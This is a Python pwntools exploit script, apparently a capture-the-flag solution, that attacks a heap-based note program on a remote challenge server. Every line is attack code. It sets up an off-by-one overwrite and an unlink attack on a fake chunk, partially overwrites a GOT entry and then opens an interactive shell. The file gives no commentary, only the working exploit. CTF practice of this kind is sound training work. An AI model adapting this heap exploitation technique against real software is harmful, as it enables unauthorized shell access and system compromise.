#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "pwn1.chal.ctf.westerns.tokyo"
port = 16317

r = remote(host,port)

def add(size,data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(data)

def remove(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def edit(idx,data):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.send(data)

add(0x128,"a")
add(0x128,"a")
add(0x128,"a")
add(136,"a"*136)
add(0x100,"b"*0xf0)
add(136+0x10,"c"*144 + "\xb0\x01")
remove(1+3)
edit(0+3,"a"*136 + "\xb0\x01")
add(0x190,"a"*0x100 + p64(0x190) + p64(0xa0))
edit(0+3,p64(0x0) + p64(0x191) + p64(0x6020d8-0x18) + p64(0x6020d8-0x10))
remove(2+3)
edit(3,p64(0x0000000000602058)[:3])
edit(0,"\x90\xf3")
r.recvuntil(":")
r.sendline("sh\x00")
r.interactive()
